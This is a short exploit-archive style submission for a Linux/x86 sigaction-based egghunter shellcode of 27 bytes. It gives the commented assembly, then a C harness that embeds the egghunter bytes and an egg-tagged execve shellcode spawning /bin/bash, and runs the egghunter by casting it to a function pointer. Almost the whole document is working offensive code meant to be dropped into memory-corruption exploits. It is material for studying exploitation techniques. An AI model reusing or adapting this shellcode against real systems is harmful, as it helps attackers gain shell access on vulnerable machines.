/*
# Title: Linux/x86 - Egghunter + sigaction-based Shellcode (27 bytes)
# Author:Valbrux
# Date: 2018-09-19
# This exploit is a dirty-slow but small version of the sigaction-based egg hunter shellcode

global _start

section .text

;zeroing ecx
xor ecx,ecx

_start:
	;increment
	inc ecx
	;sigaction syscall number
	push byte 67
	pop eax
	;executing syscall
	int 0x80
	;if EFAULT
	cmp al,0xf2
	;page alignment
	jz _start
	;moving EGG
	mov eax,0x50905090
	;current address
	mov edi,ecx
	;checking current address with EGG two times
	scasd
	jnz _start
	scasd
	jnz _start
	;if equals jump to shellcode
	jmp edi

*/

#include <stdio.h>
#include <string.h>
#define EGG "\x90\x50\x90\x50"

unsigned char code[] = EGG EGG"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

//27 Bytes
unsigned char egg[] = "\x31\xc9\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf6\xb8"EGG"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

main()
{
	printf("Egg length: %d\n",strlen(egg));
	printf("Shellcode lenght: %d\n",strlen(code));
	int (*ret)() = (int(*)())egg;
	ret();

}